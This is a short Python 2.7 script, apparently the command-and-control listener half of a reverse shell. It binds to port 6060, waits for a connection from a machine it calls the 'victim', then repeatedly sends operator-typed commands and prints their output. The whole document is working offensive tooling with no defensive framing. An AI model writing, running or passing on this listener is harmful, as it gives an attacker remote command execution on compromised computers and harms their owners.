#!/usr/bin/python2.7
#-*- coding: utf-8 -*-

#################################################
#Title : Socket	Reverse	(Serv)					#
#DAte : 05/09/2017								#
#Author : GrandPa								#
################################################# 

#################################################
#Import externals functions: 

import socket, subprocess, os, sys
import time 


#################################################
#Def local or global: 
hote = ''
port = 6060
mysock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#################################################
#Programm Body:

mysock.bind((hote, port))
mysock.listen(5)
conn, address = mysock.accept()
print "{} connected".format( address )
victim = conn.recv(16384)

#time.slep(10)

while 1:
	shell = raw_input('code to victim: ')
	if shell == 'end':
		conn.close()
		mysock.close()
		sys.exit()
	command = conn.send(shell)
	result = conn.recv(16384)
	if result != victim:
		print result
